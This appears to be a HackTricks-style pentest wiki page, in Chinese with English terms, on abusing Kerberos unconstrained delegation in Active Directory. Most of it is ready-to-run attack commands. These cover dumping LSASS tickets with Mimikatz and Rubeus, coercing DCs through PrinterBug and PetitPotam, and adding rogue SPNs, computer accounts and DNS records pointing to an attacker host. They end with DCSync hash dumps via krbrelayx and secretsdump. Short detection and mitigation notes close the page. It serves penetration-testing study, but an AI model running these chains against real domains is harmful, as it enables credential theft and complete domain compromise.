# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

这是一个 Domain Administrator 可以为域内任何 **Computer** 设置的功能。然后，每当某个 **user logins** 到该 Computer 时，该用户的 **TGT 副本** 会作为由 DC 提供的 **TGS** 的一部分 **发送**，并且 **保存在 LSASS 的内存中**。所以，如果你在这台机器上拥有 Administrator 权限，你就可以 **dump tickets 并冒充用户** 在任何机器上登录。

因此，如果某个 domain admin 在启用了 "Unconstrained Delegation" 功能的 Computer 中登录，而你在那台机器上拥有 local admin 权限，你就可以 dump 该 ticket，并在任何地方冒充 Domain Admin（domain privesc）。

你可以通过检查 [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) 属性是否包含 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 来 **find Computer objects with this attribute**。你可以使用 LDAP filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ 来做到这一点，这也是 powerview 的做法：
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
使用 **Mimikatz** 或 **Rubeus** 将 Administrator（或受害用户）的 ticket 加载到内存中，用于 [**Pass the Ticket**](pass-the-ticket.md)**。**\
更多信息： [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**关于 ired.team 中 Unconstrained delegation 的更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

如果攻击者能够**compromise** 一台被允许进行 **"Unconstrained Delegation"** 的计算机，他就可以**诱骗**一台 **Print server** **自动登录** 到这台机器上，从而在服务器内存中**保存一个 TGT**。\
然后，攻击者就可以执行 **Pass the Ticket attack** 来**冒充** Print server 的计算机账户用户。

要让 print server 登录到任意机器上，你可以使用 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)：
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
如果 TGT 来自 domain controller，你可以执行 [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) 并获取 DC 上的所有 hashes。\
[**关于这个 attack 的更多信息在 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

在这里查找其他 **force an authentication** 的方式：


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

任何其他能够让受害者通过 **Kerberos** 向你的 unconstrained-delegation host 进行认证的 coercion primitive 也可以。在现代环境中，这通常意味着根据可达的 RPC surface，在经典的 PrinterBug flow 之外改用 **PetitPotam**、**DFSCoerce**、**ShadowCoerce**、**MS-EVEN** 或基于 **WebClient/WebDAV** 的 coercion。

### 利用具有 unconstrained delegation 的 user/service account

Unconstrained delegation **不只限于 computer objects**。**user/service account** 也可以被配置为 `TRUSTED_FOR_DELEGATION`。在这种情况下，实际要求是该 account 必须接收到其拥有的某个 **SPN** 的 Kerberos service tickets。

这会导向 2 条非常常见的 offensive path：

1. 你拿到 unconstrained-delegation **user account** 的 password/hash，然后给同一个 account **添加一个 SPN**。
2. 该 account 已经有一个或多个 SPN，但其中一个指向一个 **stale/decommissioned hostname**；只要重新创建缺失的 **DNS A record**，就足以劫持 authentication flow，而无需修改 SPN set。

Minimal Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- 这在 unconstrained principal 是一个 **service account** 且你只有它的凭据、没有 joined host 上的 code execution 时，尤其有用。
- 如果目标用户已经有一个 **stale SPN**，重新创建对应的 **DNS record** 可能比在 AD 中写入一个新的 SPN 更不显眼。
- 最近以 Linux 为中心的 tradecraft 使用 `addspn.py`、`dnstool.py`、`krbrelayx.py`，以及一种 coercion primitive；你无需接触 Windows host 就能完成整条链。

### Abusing Unconstrained Delegation with an attacker-created computer

现代 domains 往往有 `MachineAccountQuota > 0`（默认 10），允许任何 authenticated principal 创建最多 N 个 computer objects。如果你还拥有 `SeEnableDelegationPrivilege` token privilege（或等效权限），你可以把新创建的 computer 设为 trusted for unconstrained delegation，并从特权系统中获取传入的 TGTs。

High-level flow:

1) 创建一个你控制的 computer
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) 让 fake hostname 在 domain 内可解析
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) 在攻击者控制的计算机上启用 Unconstrained Delegation
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
为什么这可行：在 unconstrained delegation 下，启用 delegation 的计算机会缓存传入的 TGT。如果你诱使 DC 或特权服务器对你的假主机进行身份验证，它的 machine TGT 就会被存储，并且可以导出。

4) 以 export mode 启动 krbrelayx 并准备 Kerberos 材料
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) 从 DC/servers 强制进行 authentication 到你的 fake host
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx 会在机器进行身份验证时保存 ccache 文件，例如：
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) 使用捕获到的 DC machine TGT 执行 DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notes and requirements:

- `MachineAccountQuota > 0` 允许非特权用户创建 computer；否则你需要显式权限。
- 在 computer 上设置 `TRUSTED_FOR_DELEGATION` 需要 `SeEnableDelegationPrivilege`（或 domain admin）。
- 确保解析到你的 fake host 的 name resolution 正常（DNS A record），这样 DC 才能通过 FQDN 访问它。
- coercion 需要一个可用 vector（PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, 等）。如果可能，在 DC 上禁用这些。
- 如果受害 account 被标记为 **"Account is sensitive and cannot be delegated"** 或属于 **Protected Users**，forwarded TGT 将不会被包含在 service ticket 中，因此这条链不会得到可复用的 TGT。
- 如果在认证的 client/server 上启用了 **Credential Guard**，Windows 会阻止 **Kerberos unconstrained delegation**，这可能会让从 operator 视角看起来有效的 coercion path 失败。

Detection and hardening ideas:

- 关注 Event ID 4741（computer account created）以及 4742/4738（computer/user account changed），尤其是在 UAC 设置了 `TRUSTED_FOR_DELEGATION` 时。
- 监控域 zone 中异常的 DNS A-record additions。
- 关注来自意外 host 的 4768/4769 激增，以及 DC-authentications 到非-DC hosts。
- 将 `SeEnableDelegationPrivilege` 限制给最小集合，在可行时设置 `MachineAccountQuota=0`，并在 DC 上禁用 Print Spooler。强制启用 LDAP signing 和 channel binding。

### Mitigation

- 将 DA/Admin logins 限制到特定 services
- 为 privileged accounts 设置 "Account is sensitive and cannot be delegated"。

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
